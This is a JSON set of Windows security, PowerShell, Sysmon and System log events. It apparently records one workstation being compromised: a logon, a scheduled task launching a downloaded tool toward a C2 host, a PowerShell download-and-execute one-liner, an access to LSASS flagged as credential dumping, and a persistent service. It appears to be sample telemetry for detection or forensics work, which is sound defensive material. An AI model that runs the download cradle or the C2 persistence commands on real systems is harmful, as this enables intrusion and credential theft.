[
  {
    "EventID": 4624,
    "Channel": "Security",
    "Computer": "WKS-07.corp.local",
    "TimeCreated": "2026-03-15 14:22:00.341",
    "EventRecordID": 1284001,
    "SubjectUserSid": "S-1-5-18",
    "SubjectUserName": "WKS-07$",
    "SubjectDomainName": "CORP",
    "SubjectLogonId": "0x3e7",
    "TargetUserSid": "S-1-5-21-1581655573-1957994488-1801674531-1107",
    "TargetUserName": "analyst",
    "TargetDomainName": "CORP",
    "TargetLogonId": "0x4f1289a",
    "LogonType": 2,
    "LogonProcessName": "User32 ",
    "AuthenticationPackageName": "Negotiate",
    "WorkstationName": "WKS-07",
    "LogonGuid": "{00000000-0000-0000-0000-000000000000}",
    "TransmittedServices": "-",
    "LmPackageName": "-",
    "KeyLength": 0,
    "ProcessId": "0x2e8",
    "ProcessName": "C:\\Windows\\System32\\winlogon.exe",
    "IpAddress": "127.0.0.1",
    "IpPort": "0",
    "ImpersonationLevel": "%%1833",
    "RestrictedAdminMode": "-"
  },
  {
    "EventID": 4698,
    "Channel": "Security",
    "Computer": "WKS-07.corp.local",
    "TimeCreated": "2026-03-15 14:22:03.117",
    "EventRecordID": 1284015,
    "SubjectUserSid": "S-1-5-18",
    "SubjectUserName": "WKS-07$",
    "SubjectDomainName": "CORP",
    "SubjectLogonId": "0x3e7",
    "TaskName": "\\RemoteHandsSync",
    "TaskContent": "<?xml version=\"1.0\" encoding=\"UTF-16\"?>\n<Task version=\"1.2\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\">\n  <Triggers><LogonTrigger><Enabled>true</Enabled></LogonTrigger></Triggers>\n  <Principals><Principal id=\"Author\"><UserId>S-1-5-18</UserId><RunLevel>HighestAvailable</RunLevel></Principal></Principals>\n  <Actions Context=\"Author\"><Exec><Command>C:\\Users\\analyst\\Downloads\\remote-admin.exe</Command><Arguments>--connect c2.example.com --silent</Arguments></Exec></Actions>\n</Task>",
    "ClientProcessId": "0x10b0",
    "ParentProcessId": "0x10a4"
  },
  {
    "EventID": 4104,
    "Channel": "Microsoft-Windows-PowerShell/Operational",
    "Computer": "WKS-07.corp.local",
    "TimeCreated": "2026-03-15 14:23:00.804",
    "EventRecordID": 88412,
    "MessageNumber": 1,
    "MessageTotal": 1,
    "ScriptBlockText": "$c=New-Object Net.WebClient; IEX($c.DownloadString('http://198.51.100.23/s'))",
    "ScriptBlockId": "{8c3a4e92-1d77-4e5b-94f9-6611c7e4b3a1}",
    "Path": "",
    "UserId": "S-1-5-21-1581655573-1957994488-1801674531-1107"
  },
  {
    "EventID": 10,
    "Channel": "Microsoft-Windows-Sysmon/Operational",
    "Computer": "WKS-07.corp.local",
    "TimeCreated": "2026-03-15 14:25:00.221",
    "EventRecordID": 2009881,
    "RuleName": "technique_id=T1003,technique_name=Credential Dumping",
    "UtcTime": "2026-03-15 14:25:00.221",
    "SourceProcessGUID": "{8c3a4e92-aabb-4e5b-94f9-6611c7e4b3a1}",
    "SourceProcessId": "0x12fc",
    "SourceImage": "C:\\Users\\analyst\\Downloads\\remote-admin.exe",
    "TargetProcessGUID": "{aaaaaaaa-0000-0000-0000-aaaaaaaaaaaa}",
    "TargetProcessId": "0x2e8",
    "TargetImage": "C:\\Windows\\System32\\lsass.exe",
    "GrantedAccess": "0x1FFFFF",
    "CallTrace": "C:\\Windows\\SYSTEM32\\ntdll.dll+9c534|C:\\Windows\\System32\\KERNELBASE.dll+30819|UNKNOWN(0000000178A12F31)",
    "SourceUser": "CORP\\analyst",
    "TargetUser": "NT AUTHORITY\\SYSTEM"
  },
  {
    "EventID": 7045,
    "Channel": "System",
    "Computer": "WKS-07.corp.local",
    "TimeCreated": "2026-03-15 14:25:30.601",
    "EventRecordID": 5512018,
    "SubjectUserSid": "S-1-5-21-1581655573-1957994488-1801674531-1107",
    "SubjectUserName": "analyst",
    "SubjectDomainName": "CORP",
    "ServiceName": "RemoteHandsHelper",
    "ImagePath": "C:\\Users\\analyst\\AppData\\Local\\Temp\\rhh.exe --service",
    "ServiceType": "user mode service",
    "StartType": "auto start",
    "AccountName": "LocalSystem"
  }
]